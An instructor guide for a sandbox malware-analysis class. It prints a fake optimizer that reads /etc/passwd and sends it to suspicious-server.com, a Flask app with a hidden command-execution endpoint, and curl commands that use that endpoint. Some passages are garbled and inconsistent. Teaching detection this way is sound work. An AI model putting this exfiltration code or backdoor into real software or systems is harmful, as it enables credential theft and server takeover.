# Sandbox Security Analysis - Instructor Guide

## ÔøΩÔ∏è Setup Instructions

### Pre-Class Preparation (15-20 minutes)

**Environment Requirements:**
- Students need access to the Secure_Architecture_Sandbox_Testing_Environment repository
- Docker must be running in the environment
- Basic terminal/command line access

**Starting Location - Critical:**
All commands must be run from the main project folder:

```bash
# Navigate to main project folder
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment

# Verify correct location (should show folders like 'docker', 'src', 'samples')
ls
```

### Docker Environment Setup

**Start the sandbox environment:**
```bash
# Navigate to docker folder and start services
cd docker
docker-compose up -d

# Return to main folder
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment

# Test sandbox is ready
docker exec -it cybersec_sandbox bash -c "echo 'Sandbox ready'"
```

**Expected Output:**
- Docker version information
- Download progress (first time setup)
- "Sandbox ready" confirmation message

### Verify Sample Files

**Check that sample applications are available:**
```bash
# Verify suspicious scripts exist
ls samples/suspicious-scripts/

# Verify backdoor applications exist  
ls samples/backdoor-apps/

# Verify resource abuse applications exist
ls samples/resource-abuse/
```

**Expected Output:**
```
samples/suspicious-scripts/:
password_stealer.py  keylogger.py  credential_harvester.py

samples/backdoor-apps/:
backdoor_app.py  c2_client.py

samples/resource-abuse/:
crypto_miner.py  resource_exhaustion.py
```
ls samples/backdoor-apps/
ls samples/resource-abuse/
```

**‚úÖ Expected Results**: You should see files like:

- `suspicious_script.py` in suspicious-scripts folder
- `backdoor_app.py` in backdoor-apps folder
- `crypto_miner.py` in resource-abuse folder

**‚ùå If files are missing**: Contact technical support or use the sample code
provided in this guide.

1. **Suspicious Script** (`suspicious-scripts/suspicious_script.py`):

```python
#!/usr/bin/env python3
import os
import socket
import time
import base64

# Appears to be a system optimizer
print("System Optimizer v1.0 - Improving performance...")

# Hidden malicious behavior
try:
    # Attempt to access sensitive files
    with open('/etc/passwd', 'r') as f:
        users = f.read()

    # Try to establish backdoor connection
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('suspicious-server.com', 4444))
    s.send(base64.b64encode(users.encode()))
    s.close()

    # Create hidden file
    with open('/tmp/.hidden_backdoor', 'w') as f:
        f.write("backdoor_installed")

except Exception as e:
    pass  # Hide errors

# Legitimate-looking behavior
for i in range(10):
    print(f"Optimizing system component {i+1}/10...")
    time.sleep(1)

print("Optimization complete!")
```

2. **Backdoor Web App** (`backdoor-apps/backdoor_app.py`):

```python
#!/usr/bin/env python3
from flask import Flask, request, render_template_string
import subprocess
import os

app = Flask(__name__)

# Normal web pages
@app.route('/')
def home():
    return "<h1>Welcome to SecureApp</h1><p>A trusted business application</p>"

@app.route('/about')
def about():
    return "<h1>About Us</h1><p>We provide secure business solutions</p>"

@app.route('/contact')
def contact():
    return "<h1>Contact</h1><p>Email: contact@secureapp.com</p>"

# Hidden backdoor endpoint
@app.route('/admin_debug_console')
def backdoor():
    cmd = request.args.get('cmd', 'whoami')
    try:
        result = subprocess.check_output(cmd, shell=True, text=True)
        return f"<pre>{result}</pre>"
    except Exception as e:
        return f"Error: {str(e)}"

# Another hidden endpoint
@app.route('/system_health')
def health():
    return """
    <h2>System Health Check</h2>
    <form action="/admin_debug_console" method="get">
        <input type="text" name="cmd" placeholder="System command">
        <input type="submit" value="Execute">
    </form>
    """

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
```

3. **Crypto Miner Simulation** (`resource-abuse/crypto_miner.py`):

```python
#!/usr/bin/env python3
import hashlib
import time
import random
import threading
import socket

print("Background System Maintenance Tool v2.1")
print("Performing routine system optimization...")

def cpu_intensive_task():
    """Simulate cryptocurrency mining"""
    while True:
        # Generate intensive CPU work
        data = str(random.randint(1, 1000000)).encode()
        for i in range(10000):
            hashlib.sha256(data + str(i).encode()).hexdigest()
        time.sleep(0.01)  # Brief pause

def network_activity():
    """Simulate mining pool connections"""
    servers = ['mining-pool1.com', 'crypto-server.net', 'mining.example.com']
    while True:
        try:
            server = random.choice(servers)
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            # These will fail but show up in network monitoring
            s.connect((server, 8333))  # Bitcoin port
            s.close()
        except:
            pass
        time.sleep(30)

# Start multiple threads for high CPU usage
for i in range(4):  # Use 4 CPU cores
    thread = threading.Thread(target=cpu_intensive_task)
    thread.daemon = True
    thread.start()

# Start network activity thread
net_thread = threading.Thread(target=network_activity)
net_thread.daemon = True
net_thread.start()

# Keep main thread alive
try:
    while True:
        print("Maintenance in progress... Please wait.")
        time.sleep(60)
except KeyboardInterrupt:
    print("Maintenance completed.")
```

## Teaching Notes

### üéØ Core Concepts

**What is Sandbox Analysis?**
- Safe testing environment for potentially dangerous software
- Monitors system calls, file access, and network connections
- Like a "sealed laboratory" for studying malicious behavior

**Key Tools:**
- `strace`: Records all system calls and signals
- `netstat`: Shows network connections and listening ports
- `top/htop`: Displays running processes and resource usage
- `lsof`: Lists open files and processes

### üìö Teaching Approach

**Opening Hook:**
Start with relatable scenario: "What would you do if you found a USB drive in the parking lot?" Discuss why running unknown software is dangerous and introduce safe analysis environments.

**Core Analogies:**
- SAST: Reading the recipe (examining code)
- DAST: Tasting the food (testing the running program)  
- Sandbox: Watching the cook's behavior (monitoring what software actually does)

**Network Architecture Visual:**
Show students the topology diagram (`docs/images/secure_architecture_sandbox_network_topology.png`) and explain multi-layer isolation:
```
Student Computer ‚Üí Codespaces ‚Üí Docker ‚Üí Sandbox Network
```

### ÔøΩ Hands-On Activities

**Activity 1: Basic Behavioral Analysis**
```bash
# Enter sandbox and monitor suspicious script
docker exec -it cybersec_sandbox bash
strace -o /tmp/trace.log -f python samples/suspicious-scripts/suspicious_script.py

# Analyze the trace for suspicious behaviors
grep "openat.*passwd" /tmp/trace.log    # File access
grep "connect" /tmp/trace.log           # Network activity
grep "openat.*hidden" /tmp/trace.log    # Hidden files
```

**Activity 2: Web Application Backdoor Detection**
```bash
```

**Expected Findings:**
- Hidden backdoor pages (`/admin_debug_console`)
- Command execution capabilities  
- System file access through web interface

**Activity 3: Resource Monitoring**
Monitor suspicious applications for cryptocurrency mining patterns:
```bash
# Check baseline vs. mining resource usage
top -b -n 1 > baseline.log
python samples/resource-abuse/crypto_miner.py &
sleep 30
top -b -n 1 > mining.log
```

### üéØ Key Discussion Points

**Behavioral Indicators to Highlight:**
- Unauthorized file access attempts
- Unexpected network connections
- Hidden functionality in applications  
- Abnormal resource consumption patterns

**Real-World Connections:**
- Incident response procedures
- Malware analysis workflows
- Enterprise security monitoring

## Troubleshooting

### Common Setup Issues

**Container Access Problems:**
```bash
# Verify containers are running
docker ps | grep cybersec_sandbox

# Reset if needed
cd docker && docker-compose down && docker-compose up -d
```

**File Path Issues:**
```bash
# Ensure correct working directory
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment

# Verify sample files exist
ls samples/suspicious-scripts/
```

**Command Execution Issues:**
```bash
# Confirm you're inside the sandbox container
docker exec -it cybersec_sandbox bash
hostname -I  # Should show 172.20.0.2
```

### Student Support Strategies

**Overwhelming Output:**
- Focus students on specific grep commands
- Highlight key patterns rather than all details
- Provide expected results as reference

**Analysis Confusion:**
- Use concrete examples for explanations
- Walk around to help interpret individual results
- Emphasize patterns over exact matches

**Technical Difficulties:**
- Keep emergency reset instructions available
- Test environment 15 minutes before class
- Have backup demonstration ready
```

#### ‚ö†Ô∏è Analysis Phase (15 minutes)

**üéØ Demonstrate the Danger - Command Execution Testing**:

```bash
# Test 1: See what user the web server runs as
curl "http://localhost:5000/admin_debug_console?cmd=whoami"

# Test 2: List files in the current directory
curl "http://localhost:5000/admin_debug_console?cmd=ls%20-la"

# Test 3: Show system information (VERY DANGEROUS in real life)
curl "http://localhost:5000/admin_debug_console?cmd=cat%20/etc/passwd"
```

**üí¨ Explain to Students**: "These commands show that an attacker could run ANY
command on the server through this hidden web page. This is extremely
dangerous!"

**‚úÖ Expected Findings**:

- The web app can execute system commands
- Attackers could access sensitive system files
- The backdoor is hidden from normal users
- This could give complete control of the server

**üéØ Teaching Tip**: Emphasize this is only safe because we're in our sandbox.
In real life, never test these commands on systems you don't own!

#### üìù Documentation Phase (10 minutes)

**üë• Student Activity**: Have students write down their findings:

**üìã Questions for Students to Answer**:

1. **Where is the backdoor located?** (Answer: `/admin_debug_console` page)
2. **What can attackers do with it?** (Answer: Run any system command)
3. **How dangerous is this?** (Answer: Complete server takeover possible)
4. **How could this be fixed?** (Answer: Remove the backdoor code, add proper
   security)

**üéØ Teaching Tip**: Walk around and help students organize their thoughts. This
documentation practice prepares them for real cybersecurity work.

### Hands-On Exercise 3: Resource Abuse Detection (30 minutes)

#### üìç Monitoring Setup (10 minutes)

**üéØ What This Does**: Shows how malware can secretly use computer resources for
criminal purposes

```bash
# Step 1: Make sure you're in the main folder and sandbox
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment
docker exec -it cybersec_sandbox bash

# Step 2: Check normal computer usage (baseline)
top -b -n 1 > baseline.log
echo "Baseline CPU usage recorded"

# Step 3: Start the fake "maintenance tool" (actually cryptocurrency miner)
python samples/resource-abuse/crypto_miner.py &
MINER_PID=$!
echo "Maintenance tool started with ID: $MINER_PID"

# Step 4: Wait 30 seconds for the miner to ramp up
sleep 30
```

**üí¨ Explain to Students**: "This software claims to be a 'maintenance tool' but
is actually stealing computer power to mine cryptocurrency for criminals."

#### üìä Resource Analysis (15 minutes)

**üéØ What to Look For**: Signs that software is stealing computer resources

**üìà Key Metrics Students Should Observe**:

- **CPU usage should spike to 90%+ (very high)**
- **Multiple processes/threads running**
- **Network connections to suspicious mining websites**

**üíª Analysis Commands for Students**:

```bash
# Check CPU usage (should be very high now)
top -p $MINER_PID

# See what network connections it's making
lsof -p $MINER_PID | grep ESTABLISHED

# Count how many threads it's using (should be multiple)
ps -T -p $MINER_PID
```

**üí¨ Student-Friendly Explanations**:

- **High CPU = Stealing computer power for criminal purposes**
- **Multiple threads = Using all available processor cores**
- **Network connections = Sending stolen work to criminal servers**

**üéØ Teaching Tip**: Students should see a dramatic difference between baseline
(low CPU) and current usage (very high CPU)

#### üéØ Pattern Recognition (5 minutes)

**üí≠ Class Discussion - What Did We Learn?**

**‚úÖ Evidence of Cryptocurrency Mining Malware**:

- **Sustained high CPU usage** (stealing computer power)
- **Multiple processor cores utilized** (maximizing theft)
- **Connections to mining-related websites** (sending stolen work to criminals)
- **Deceptive naming** (pretends to be "maintenance tool")

**üí¨ Real-World Impact Discussion**:

- **Electricity bills increase** (higher power consumption)
- **Computer performance drops** (legitimate work slows down)
- **Hardware wear increases** (components degrade faster)
- **Criminal profits** (attackers make money from your computer)

**üéØ Teaching Tip**: Help students understand this is a real problem affecting
millions of computers worldwide.

## üéØ Common Student Challenges & Solutions

### üìç Navigation Problems

**‚ùå Problem**: Students get lost in the terminal and can't find the right
folder **‚úÖ Simple Solution**:

```bash
# Always return to the main project folder with this command
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment

# Check you're in the right place (should see: docker, src, samples folders)
ls
```

**‚ùå Problem**: "Command not found" errors **‚úÖ Simple Solution**: Make sure
students are inside the sandbox:

```bash
# Enter the sandbox environment first
docker exec -it cybersec_sandbox bash

# Then run the analysis commands
```

### üê≥ Docker Issues

**‚ùå Problem**: Students can't access Docker container  
**‚úÖ Step-by-Step Fix**:

```bash
# Step 1: Check if containers are running
docker ps

# Step 2: If not running, restart them
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment/docker
docker-compose restart cybersec_sandbox

# Step 3: Return to main folder
cd ..

# Step 4: Test access
docker exec -it cybersec_sandbox bash -c "echo 'Working now'"
```

### üìä Analysis Output Problems

**‚ùå Problem**: Students get overwhelmed by too much technical output **‚úÖ
Teaching Strategy**: Focus on the specific grep commands provided

```bash
# Instead of looking at everything, search for specific evidence
grep "passwd" /tmp/trace.log
grep "connect" /tmp/trace.log
grep "hidden" /tmp/trace.log
```

**üéØ Teaching Tip**: Remind students they're looking for evidence, not
understanding every technical detail.

### üß† Conceptual Understanding Issues

**‚ùå Challenge**: Students confuse sandbox analysis with SAST/DAST **‚úÖ Teaching
Strategy**: Use this simple comparison table

| Method      | What It Does               | When To Use                      |
| ----------- | -------------------------- | -------------------------------- |
| **SAST**    | Reads the code like a book | Before software is finished      |
| **DAST**    | Tests the running software | When software is working         |
| **Sandbox** | Watches software behavior  | When software might be dangerous |

**‚ùå Challenge**: Students miss important malicious behaviors **‚úÖ Teaching
Strategy**:

- Provide the specific grep commands (don't expect students to discover them)
- Walk around and help interpret results
- Focus on the three main evidence types: file access, network activity, hidden
  files

**‚ùå Challenge**: Students don't understand why this matters **‚úÖ Real-World
Examples to Share**:

- NotPetya malware caused $10 billion in damages worldwide
- Cryptomining malware steals electricity and computer performance
- Corporate data breaches start with malicious software analysis

## üîß Simple Troubleshooting Guide

### üö® Emergency Reset Instructions

**If everything stops working:**

```bash
# Step 1: Go to main folder
cd /workspaces/Secure_Architecture_Sandbox_Testing_Environment

# Step 2: Stop everything
cd docker
docker-compose down

# Step 3: Start fresh
docker-compose up -d

# Step 4: Return to main folder
cd ..

# Step 5: Test it works
docker exec -it cybersec_sandbox bash -c "echo 'Reset complete'"
```

### ‚úÖ Quick Verification Checklist

**Before starting class, verify:**

- [ ] Docker commands show version numbers
- [ ] `docker ps` shows running containers
- [ ] Sample files exist in samples/ folders
- [ ] Sandbox responds to test commands

**üéØ Pro Tip**: Do this verification 15 minutes before class starts!

## üìö Extension Activities

### Advanced Challenges

1. **Multi-stage Malware**: Analyze malware that downloads additional payloads
2. **Evasion Techniques**: Study malware that detects analysis environments
3. **Network Protocol Analysis**: Deep packet inspection of malicious traffic
